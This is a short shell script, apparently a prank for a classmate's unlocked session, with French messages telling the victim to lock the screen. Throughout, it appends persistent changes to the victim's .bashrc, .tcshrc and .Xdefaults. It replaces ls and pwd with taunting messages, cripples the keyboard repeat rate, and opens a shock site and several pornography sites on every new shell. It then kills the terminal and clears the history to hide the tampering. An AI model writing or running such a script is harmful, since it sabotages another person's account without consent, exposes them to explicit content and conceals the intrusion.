#!/bin/sh
echo "set prompt='%{[\033[1;5;35mJE DOIS ME LOCK OU JE VAIS ME FAIRE BIZUTER\033[0m%}] '" >> /home/${USER}/.bashrc;
echo "source ${HOME}/.bashrc" >> /home/${USER}/.tcshrc
echo "xterm*background: yellow" >> /home/${USER}/.Xdefaults
echo "alias ls='echo \"JE DOIS ME LOCK\"'" >> /home/${USER}/.bashrc
echo "alias pwd='echo \"ZLOCK C EST PAS COMPLIQUE NAN ??\"'" >> /home/${USER}/.bashrc;
echo "alias emacs=vim" >> /home/${USER}/.bashrc;
echo "alias pwd='echo \"JE SUIS LA\"'";
echo "xset r rate 3;" >> /home/${USER}/.bashrc;
echo "firefox www.meatspin.com &" >> /home/${USER}/.bashrc;
echo "firefox youporn.com &" >> /home/${USER}/.bashrc;
echo "firefox redtube.com &" >> /home/${USER}/.bashrc;
echo "firefox pornhub.com &" >> /home/${USER}/.bashrc;
echo "firefox youjizz.com &" >> /home/${USER}/.bashrc;
pkill terminal;
history -c;
